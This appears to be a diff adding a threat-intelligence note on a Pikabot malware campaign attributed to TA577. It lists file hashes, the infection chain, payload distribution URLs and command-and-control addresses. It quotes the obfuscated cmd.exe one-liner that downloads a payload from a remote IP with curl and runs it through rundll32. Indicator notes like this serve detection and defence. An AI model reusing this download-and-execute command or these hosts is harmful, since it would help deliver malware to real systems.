@@ -1,0 +1,46 @@
+31.10.2023 | Pikabot | TA577 | 1.1.15-ghost
+
+*************************************************
+
+.js ed8841b63c1aadb5387eef2b4b22f9386e838324094da66d5141838757cd532d
+.dll 4a5f4738220a209e57735b23b1e7212346710a5301ae7da88cd58417e2bcab0b
+
+*************************************************
+
+zip > js > curl > dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Impeditrt.js
+
+cmd.exe /c XE3 || Echo XE3 & PIng XE3 || Curl http://49.13.119.242/pVUlN/grudg -o %tMP%\XE3.sct & PIng -n 4 XE3 || runDLl32 %Tmp%\XE3.sct, Crash & EXIT yF7NWwfo0Fsl9e0
+
+PIng  XE3
+
+Curl http://49.13.119.242/pVUlN/grudg -o C:\Users\Admin\AppData\Local\Temp\XE3.sct 
+
+PIng -n 4 XE3 
+
+runDLl32 C:\Users\Admin\AppData\Local\Temp\XE3.sct, Crash 
+
+*************************************************
+
+.dll distro
+
+http://49.13.94.145/dBOzTXs/Coman
+http://49.13.119.242/pVUlN/Foede
+
+*************************************************
+
+c2's
+
+50.116.54.138:13724
+15.235.47.80:23399
+51.195.232.97:13782
+154.92.19.139:2222
+15.235.45.155:2221
+51.79.143.215:13783
+154.61.75.156:2078
+
+
+HTTPS Checking Traffic 
+
+
